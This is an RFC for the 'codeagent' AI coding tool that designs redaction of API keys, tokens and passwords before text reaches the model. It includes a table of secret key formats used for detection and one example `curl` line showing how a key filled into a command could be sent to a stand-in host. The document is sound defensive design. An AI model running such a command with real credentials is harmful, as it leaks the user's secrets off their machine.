# Hide secrets from the model

- RFC: 0030
- Status: done
- Spec: [`spec/agent-loop.md`](../spec/agent-loop.md), "System prompt",
  "Messages"; [`spec/tools.md`](../spec/tools.md), "Calls and results",
  "run_command"; [`spec/config.md`](../spec/config.md), "Built-in rules";
  [`spec/sessions.md`](../spec/sessions.md), "Persistence";
  [`spec/tui.md`](../spec/tui.md); [`spec/commit.md`](../spec/commit.md)

## Summary

Before any text goes to the model, `codeagent` looks for API keys, tokens,
passwords and private keys in it and replaces each one with a placeholder
such as `[secret: anthropic key #3f9a]`. This covers the user's messages,
tool results, command output, the system prompt and the commit prompt. The
real value never reaches the provider, the saved session or the log. When
the model writes a placeholder back into a file it edits, `codeagent` puts
the real value back, so files keep their secrets intact. The user is told
when something was hidden.

## Motivation

The built-in rules (see `spec/config.md`, "Built-in rules") keep
well-known secret *files* from the model: `.env`, `*.pem`, `.netrc`, and
so on. Secrets also reach the model by other ways:

- **The user's own message.** "Why does this fail? My key is
  sk-ant-api03-…". This is pasted often, in good faith.
- **Files that are not named like secret files.** `config.toml`,
  `settings.py`, `docker-compose.yml`, `application.properties`, test
  fixtures, notebooks, shell history in the workspace.
- **Command output.** `env`, `printenv`, `docker inspect`, `kubectl get
  secret -o yaml`, `git log -p` over a commit that once added a key, a
  build that prints its configuration, a failed `curl -v` with an
  `Authorization` header.
- **The prompt.** Skill text and `AGENTS.md` are written by people, and
  sometimes hold a token "for testing".
- **The commit prompt.** `codeagent commit` sends the staged diff, which is
  exactly where a key someone is about to commit shows up.

A key that the provider has seen is in its logs, possibly in training or
abuse-review data, and in the saved session on disk. The user then has to
rotate it. A key the model sees can also end up in a file, a commit message
or a command argument that the model writes. Replacing the value before it
leaves the machine prevents all of this; detecting it afterwards does not.

## Scope

In:

- Detection of secrets in text: values `codeagent` knows exactly (its own
  provider keys, secret-looking environment variables) and well-known key
  formats; generic `key = value` assignments only when the value looks
  random.
- Replacement with stable placeholders in everything sent to a provider:
  user messages, tool results (also the full outputs kept for the TUI),
  the system prompt with skills, `ask_user` answers, the commit prompt.
- Putting real values back into `edit_file` and `write_file` arguments,
  so a file with a secret can still be edited without losing it.
- Telling the user: a notice per message, a mark on the tool line, a row in
  the status view.
- The saved session, the event log and the log file hold only the
  placeholders.
- Settings: on/off, extra patterns, values that are not secrets.

Out:

- Stopping a command from *using* a secret. `curl -H "Authorization:
  Bearer $TOKEN"` runs with the real environment; the model only sees
  `$TOKEN` and never needs the value. A sandbox is a different RFC (open
  question 5 in `spec/readme.md`).
- Scanning the workspace for secrets, or warning about them in commits
  (a "secret scanner" feature). This RFC hides what the model would see;
  it does not audit the repository.
- Images and other non-text content (none are sent today).
- Guaranteeing that nothing is ever missed. Detection is best-effort for
  unknown formats; see "Limits of detection".

## Design

### What counts as a secret

Three sources, checked in this order. A match of an earlier source wins
when matches overlap. **(proposal)**

**Known values.** Exact strings, which are found with no false positives:

- The API keys of the configured providers, as resolved from `api_key`,
  `api_key_env` or `api_key_cmd` (see `spec/config.md`, "Provider keys").
- The values of environment variables of the server (or the `codeagent
  run` process) whose name ends in `_KEY`, `_TOKEN`, `_SECRET`, `_PASSWORD`,
  `_PASS`, `_PAT` or `_CREDENTIALS`, or is one of a short list
  (`GITHUB_TOKEN`, `GH_TOKEN`, `NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY`, …).
- Values given in `[secrets] values_env`, which names more variables to
  treat the same way.

Values shorter than 8 characters are skipped: they would match ordinary
words. Known values are matched with Aho–Corasick over the text, so
there can be many of them without slowing down.

**Key formats.** Prefixes and shapes that providers use for their keys,
each with a kind for the placeholder:

| Kind | Shape (simplified) |
|------|--------------------|
| anthropic key | `sk-ant-` then 80 or more characters of `[A-Za-z0-9_-]` |
| openai key | `sk-proj-…`, `sk-svcacct-…`, `sk-` then 40 or more characters |
| github token | `ghp_`, `gho_`, `ghu_`, `ghs_`, `ghr_` and 36 characters; `github_pat_…` |
| gitlab token | `glpat-` and 20 characters |
| aws access key | `AKIA` or `ASIA` and 16 characters of `[A-Z0-9]` |
| google api key | `AIza` and 35 characters |
| slack token | `xox[abposr]-…` |
| stripe key | `sk_live_…`, `rk_live_…` |
| huggingface token | `hf_` and 34 characters |
| private key | `-----BEGIN … PRIVATE KEY-----` up to the matching `END` line |
| jwt | three dot-separated base64url parts, the first starting `eyJ` |
| url password | the password in `scheme://user:password@host` |

The list lives in one table in the code, with a test for each entry.

**Assignments.** A value after a name that says it is secret: `api_key =
"…"`, `password: …`, `"token": "…"`, `export SECRET=…`, `Authorization:
Bearer …`. The name has to contain `key`, `token`, `secret`, `password`,
`passwd`, `pwd`, `credential`, `auth` or `bearer` (case does not matter).
The value counts only when it looks random:

- at least 12 characters;
- not an identifier or a reference: `ANTHROPIC_API_KEY`, `$TOKEN`,
  `${{ secrets.X }}`, `os.environ["X"]`, `<your-key>`, `xxx…`, `changeme`,
  `null`, `true`;
- a Shannon entropy of at least 3.5 bits per character, with letters and
  digits mixed. **(proposal)**

This is the source with false positives, so it has an off switch of its own
(`assignments = false`) and the values it hid are listed for the user (see
"Telling the user").

### Placeholders

A secret becomes `[secret: <kind> #<id>]`, for example `[secret: anthropic
key #3f9a]`, `[secret: env GITHUB_TOKEN #81c0]`, `[secret: password
#d21e]`. **(proposal)**

- `<id>` is four hex digits of a hash of the value (FNV-1a, so the hash is
  the same in every build). The same value gives the same placeholder
  everywhere in a session and across a resume, so the model can tell two
  secrets apart and see that a file and a command use the same one. Sixteen
  bits of a hash do not help to guess a key.
- Placeholders are stable, so the request prefix stays the same between
  requests (RFC 0028, "A stable prefix").
- A private key block becomes one line: `[secret: private key #…]`; the
  line count of the file changes, so `read_file` results with such a block
  say so in their header (`lines 1–40, a private key of 27 lines hidden`).

The system prompt gets one bullet:

```
- Secrets in files, output and messages are shown as [secret: KIND #ID].
  Never ask for their values. You may write a placeholder into a file you
  edit and the real value is kept; in commands, use the environment
  variable instead.
```

### Where it applies

One `Redactor` per session, built from the configuration and the
environment when the session starts, and used at every boundary to the
model:

| Text | Where |
|------|-------|
| User messages | Before the message enters the history. |
| Tool results | Before `ToolOutput.text` and `full` are stored; also the `run_command` progress sent to clients, line by line, so a secret is not split across chunks. |
| The system prompt | Skill text, the `AGENTS.md` sections, the workspace path (a path can hold a token in rare cases). |
| `ask_user` answers | Free-text answers, like user messages. |
| The commit prompt | The diff and the agent file (see `spec/commit.md`). |
| `report` arguments | Not needed: they come from the model, which never had the values. |

Results are redacted before RFC 0028's steps run, so trimming, the
unchanged-read pointer and the cleaner see only placeholders.

### Putting values back

The model edits a file that holds a secret. Without help, `edit_file`
would fail, as `old_text` holds the placeholder and the file holds the
value, and `write_file` would write the placeholder over the key.
**(proposal)**

- In the arguments of `edit_file` (`old_text`, `new_text`) and `write_file`
  (`content`), placeholders whose id the session has seen are replaced with
  their values before the tool runs. The session keeps the values in
  memory only, never on disk.
- Only for files in the workspace and its writable extra directories,
  never in the scratch directory (RFC 0029), whose files commands can send
  anywhere.
- Never for `run_command`: a command such as `curl https://x.example?k=[secret…]`
  would send the key off the machine. A placeholder in a command is
  left as it is, and the result says `run_command does not fill in
  secrets; use the environment variable`.
- A placeholder the session has not seen (after a restart of the server,
  or one the model invented) is left as it is. `edit_file` then fails
  with `old_text contains [secret: … #…], whose value is not known in this
  session; read the file again`.
- The permission question and the TUI diff show the placeholder, not the
  value.

### Telling the user

- A user message with a hidden secret gets a `notice`: `hidden from the
  model: anthropic key #3f9a in your message`. The message itself is shown
  as sent, with the value masked as `sk-ant-…3f9a`. **(proposal)**
- A tool line whose result had secrets hidden gets a mark and a count:
  `✓ read_file config/app.toml — 40 lines, 1 secret hidden`.
- The status view gets a row `secrets  3 hidden (2 known values, 1
  assignment)`.
- `codeagent run --report` counts them in `usage`-like `secrets_hidden`.

### What is stored

- `history.jsonl` and `events.jsonl` hold only the redacted text, so a
  session exported with `codeagent export` carries no secret.
- The log file gets kinds and ids, never values.
- The TUI shows what is stored: placeholders in results, masked values in
  the user's own messages. The user can read the real file with their
  editor.

### Config

```toml
[secrets]
redact = true          # hide secrets from the model; false: send text as it is
assignments = true     # also `password = "…"` and the like with random values
values_env = ["MY_SERVICE_TOKEN"]            # more variables whose values are secret
patterns = ["acme_[a-z0-9]{32}"]             # more key formats (regular expressions)
allow = ["sk-test-not-a-real-key-000000000"] # values that are never hidden
```

- `redact`, `assignments` and `allow` are user file only: a project could
  otherwise switch hiding off for its own files.
- A project file may add `patterns` and `values_env`, which only hide more.
- An invalid pattern is a configuration error, like other keys.

### Limits of detection

The table of formats and the entropy check find most keys, not all: a
16-character password with no name next to it looks like any other word.
The spec and the readme say this plainly, and the built-in `deny` rules for
secret files stay the first line. The design favours few false positives
in code (git hashes, checksums in `Cargo.lock`, UUIDs and base64 test data
are not secrets and must stay visible), because a model that cannot see a
hash it needs does worse work.

## Spec changes

- `spec/agent-loop.md`: a section "Secrets": the redactor, where it
  applies, the prompt bullet.
- `spec/tools.md`: results are redacted; `edit_file` and `write_file` fill
  in known placeholders; `run_command` does not.
- `spec/config.md`: `[secrets]`; "Built-in rules" points to it.
- `spec/sessions.md`, "Persistence": stored text is redacted.
- `spec/tui.md`: the mark on tool lines, the masked user message, the
  status row.
- `spec/commit.md`: the diff is redacted.
- `readme.md`: a short section with the limits.

## Testing

- Each format of the table: a real-shaped example is hidden; lookalikes
  (a git hash, a `Cargo.lock` checksum, a UUID, `sk-` in prose,
  `api_key_env = "ANTHROPIC_API_KEY"`) are not.
- Known values: a provider key from `api_key_cmd` and an environment
  variable are hidden in a tool result, also inside a longer line;
  values under 8 characters are not.
- Assignments: random values are hidden, placeholders and references are
  not; `assignments = false` turns it off.
- Placeholders: the same value gives the same id in two results and after
  a resume; a private key block becomes one line.
- Agent: a user message with a key reaches the scripted provider redacted,
  with a notice; a `read_file` result of a file with a key is redacted in
  the request and in the saved history.
- Putting back: `edit_file` with a placeholder in `old_text` edits the
  file and keeps the key; `write_file` writes the value; `run_command`
  with a placeholder does not get the value; an unknown id fails with the
  message above.
- `run_command` progress: a key split across two chunks is not sent to
  clients.
- Commit: the diff with a key reaches the provider redacted.
- Config: parse, project file may add patterns but not `allow` or
  `redact`, invalid regex is an error.

## Implementation plan

1. **Detection and placeholders**
   - Status: done
   - Files: `src/secrets/mod.rs` (new: `Redactor`, `Found`, formats,
     entropy), `src/secrets/tests.rs`
   - Result: `Redactor::redact(text) -> Redacted { text, found }` and
     `Redactor::restore(text)`; no callers yet.
   - Tests: the format table, lookalikes, known values, assignments, ids.

2. **Config and known values**
   - Status: done
   - Files: `src/config/file.rs`, `src/config/mod.rs`, `src/config/tests.rs`
   - Result: `[secrets]`; the redactor is built from the provider keys and
     the environment.
   - Tests: parse, project rules, invalid pattern.

3. **The agent**
   - Status: done
   - Files: `src/agent/mod.rs`, `src/agent/prompt.rs`,
     `src/agent/system_prompt.md`, `src/agent/tests.rs`
   - Result: user messages, tool results, `ask_user` answers and the
     prompt are redacted; notices.
   - Tests: the agent cases above.

4. **Putting values back**
   - Status: done
   - Files: `src/tools/edit_file.rs`, `src/tools/write_file.rs`,
     `src/tools/run_command.rs`, `src/tools/tests.rs`
   - Result: files keep their secrets through edits; commands never get
     them.
   - Tests: the putting-back cases.

5. **Progress, commit, display**
   - Status: done
   - Files: `src/tools/run_command.rs`, `src/commit/`, `src/text/`,
     `src/tui/`, `src/report/`
   - Result: live output, the commit prompt, tool-line marks, the status
     row, `secrets_hidden` in reports.
   - Tests: split chunks, commit prompt, rendering.

6. **Spec and readme**
   - Status: done
   - Files: the spec files above, `readme.md`, `CHANGELOG.md`, `todo.md`
   - Result: the behaviour is written down, with its limits.

## Alternatives

- **Deny instead of hide.** Refuse a `read_file` or a message that holds
  a secret. Safe, but the model then cannot read `config.toml` at all to
  fix an unrelated line, and the user cannot paste a log that happens to
  hold a token. Hiding keeps the work going.
- **Ask the user each time.** One question per secret found would come
  often in some repositories and train users to say yes. Hidden by default
  with a notice is quieter and safer.
- **An external scanner (gitleaks, trufflehog).** Good rule sets, but a
  process per tool result is slow, and a new dependency to install. The
  format table can borrow their best-known rules.
- **Redact only before sending, keep values in the saved history.** The
  saved session would then hold keys on disk, and an export would carry
  them. Rejected.
- **Put values back in commands too.** Convenient for `curl` with a token,
  but it turns every command into a way to send the key anywhere; the
  environment variable does the same job safely.

## Changes while building

Approved with the build ("implement rfc0030"); the open questions took the
proposals. Where the build differs from the design above:

- **Keys from `api_key_cmd`** are not known values: getting them would run
  the command once more for each session. Their formats still catch
  provider keys.
- **Known values** are found with a plain substring search per value, not
  Aho–Corasick: a session has a handful, and it needs no new dependency.
  Values that are paths are left out, like those under 8 characters.
- **The user's message** is shown as the model gets it, with
  placeholders, not with a masked value such as `sk-ant-…3f9a`; what is
  shown is what is saved.
- **Counting** uses the placeholders in the text: the tool line, the
  `secrets` row of the status view (`3 hidden from the model`, not split
  by source) and `secrets_hidden` in run reports count them, so the
  protocol and the saved format stay as they were.
- **`run_command` with a placeholder** runs as written; the note is
  added to its result rather than refusing the call.
- **Queued messages** are hidden before `session.json` is written; the
  design forgot that they are saved before their turn starts.
- **The `read_file` header** does not say how many lines a hidden private
  key had; the placeholder on one line is enough to see it.
- **The whole system prompt** is redacted, not only the skills and agent
  files.

## Open questions

Answered while building:

1. A kind and a short id, as proposed.
2. Hidden without asking, with a notice.
3. Assignments on by default; `assignments = false` turns them off.
4. No: the TUI does not show hidden values.
5. No: `codeagent commit` hides keys but does not refuse to commit.

Asked in the draft:

1. Placeholders with a kind and a short id (proposed), or plain
   `[secret]`? The id helps the model and putting values back; it shows
   that two files share a key.
2. Should the user's own message be redacted silently, or should
   `codeagent` ask before sending a message with a secret (`send with the key
   hidden / edit the message`)?
3. Assignments on by default (proposed), or only known values and key
   formats, which have almost no false positives?
4. Should the TUI be able to show a hidden value to the user (a key on the
   tool line), given that it keeps values in memory only?
5. Should `codeagent commit` refuse to commit, rather than only hide, when
   the staged diff holds a key? That is a scanner feature (out of scope
   above), but cheap to add here.
